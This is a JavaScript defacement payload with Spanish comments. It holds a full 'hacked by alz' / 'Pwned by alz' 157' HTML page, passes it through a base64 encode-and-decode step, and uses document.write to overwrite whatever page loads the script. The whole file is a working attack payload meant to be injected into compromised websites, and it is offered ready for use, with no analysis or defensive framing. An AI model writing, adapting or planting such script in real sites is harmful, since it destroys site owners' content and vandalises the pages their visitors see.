(function(){
  // -- Pega aquí tu HTML tal cual --
  const html = `<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>hacked by alz'</title>

    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">

    <style>
        body {
            background: #000 url('https://github.com/sstivenolmos27-dev/157/blob/main/157alzWHITE.png?raw=true') no-repeat center center fixed;
            background-size: cover;
            color: #c0c0c0;
            font-family: 'Share Tech Mono', monospace;
            margin: 0;
            padding: 0;
            text-align: center;
        }

        .overlay {
            background: rgba(0, 0, 0, 0.85);
            width: 100%;
            min-height: 100vh;
            padding: 40px 20px;
        }

        .logo img {
            width: 200px;
            margin-top: 30px;
            filter: grayscale(100%) drop-shadow(0 0 25px #660000);
            animation: darkpulse 3s infinite alternate;
        }

        h1 {
            font-size: 3.5em;
            color: #a0a0a0;
            text-shadow: 0 0 10px #660000, 0 0 25px #330000;
            margin-top: 20px;
            animation: flicker 5s infinite;
        }

        .dark-text {
            font-size: 1.1em;
            max-width: 750px;
            margin: 40px auto;
            line-height: 1.7em;
            color: #b3b3b3;
            text-shadow: 0 0 6px #330000;
            background: rgba(20, 20, 20, 0.6);
            padding: 25px;
            border-radius: 8px;
            border: 1px solid rgba(100,0,0,0.3);
        }

        .footer {
            font-size: 0.85em;
            color: #666;
            margin-top: 50px;
            text-shadow: 0 0 8px #330000;
        }

        @keyframes darkpulse {
            from { filter: grayscale(100%) drop-shadow(0 0 5px #330000); }
            to { filter: grayscale(100%) drop-shadow(0 0 35px #660000); }
        }

        @keyframes flicker {
            0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% { opacity: 1; }
            20%, 24%, 55% { opacity: 0.6; }
            22% { opacity: 0.3; }
        }
    </style>

    <script>
        var ScrollMsg= "Hacked by Alz 157' ";
        var CharacterPosition=0;

        function StartScrolling() {
            document.title=ScrollMsg.substring(CharacterPosition,ScrollMsg.length)+
            ScrollMsg.substring(0, CharacterPosition);
            CharacterPosition++;
            if(CharacterPosition > ScrollMsg.length) CharacterPosition=0;
            window.setTimeout(StartScrolling,150);
        }
        StartScrolling();
    </script>
</head>

<body>
    <div class="overlay">
        
        <div class="logo">
            <img src="https://github.com/sstivenolmos27-dev/157/blob/main/superior.jpg?raw=true" alt="Alz Logo">
        </div>

       
        <h1>Pwned by alz' 157</h1>

        <div class="footer">
            ✦ Pwned by Sociedad Privada - 157 ✦
        </div>
    </div>
</body>
</html>`;

  // -- Codifica a base64 preservando UTF-8 --
  function encodeToBase64UTF8(str) {
    // convierte a bytes UTF-8 y luego a base64
    const utf8Bytes = new TextEncoder().encode(str);
    // convertir bytes a string Latin1 para btoa
    let binary = '';
    for (let i = 0; i < utf8Bytes.length; i++) {
      binary += String.fromCharCode(utf8Bytes[i]);
    }
    return btoa(binary);
  }

  // -- Decodifica base64 a HTML (preservando UTF-8) --
  function decodeBase64ToUTF8(b64) {
    const binary = atob(b64);
    const bytes = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i++) {
      bytes[i] = binary.charCodeAt(i);
    }
    try {
      return new TextDecoder('utf-8').decode(bytes);
    } catch (e) {
      // fallback
      return binary;
    }
  }

  // Generar la cadena encodeada (esto la deja "lista" dentro del archivo)
  const encoded = encodeToBase64UTF8(html);

  // Si quieres ver la cadena encoded, descomenta la línea de abajo:
  // console.log(encoded);

  // Decodificar e inyectar en el documento (reemplaza el documento actual)
  const decodedHtml = decodeBase64ToUTF8(encoded);
  document.open();
  document.write(decodedHtml);
  document.close();

})();
